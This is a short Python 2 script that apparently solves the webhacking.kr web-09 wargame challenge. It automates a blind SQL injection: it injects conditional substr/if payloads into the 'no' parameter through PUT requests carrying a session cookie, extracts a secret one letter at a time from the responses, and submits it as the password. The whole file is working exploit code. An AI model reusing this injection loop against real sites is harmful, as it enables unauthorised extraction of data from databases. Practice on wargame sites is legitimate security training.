#-*- coding: utf-8 -*-
import urllib2
import CookieConstants

challengeUrl = "http://webhacking.kr/challenge/web/web-09/index.php?no=if(substr(id,%d,1)in(%s),3,0)"
answer = ""

for caretIndex in range(1, 12):
    for charIndex in range(ord('a'), ord('z')):
        httpRequest = urllib2.Request(challengeUrl %(caretIndex, hex(charIndex)))
        httpRequest.get_method = lambda: 'PUT'
        httpRequest.add_header("Cookie", CookieConstants.sessionId)
        
        httpResponse = urllib2.urlopen(httpRequest).read()
        if str(httpResponse).find("Secret") != -1:
            print "find[%02d] : %s" %(caretIndex, chr(charIndex))
            answer += chr(charIndex)
            break

print answer
challengeUrl = "http://webhacking.kr/challenge/web/web-09/index.php?pw=" + answer
httpRequest = urllib2.Request(challengeUrl)
httpRequest.get_method = lambda: 'PUT'
httpRequest.add_header("Cookie", CookieConstants.sessionId)

httpResponse = urllib2.urlopen(httpRequest).read()
print httpResponse
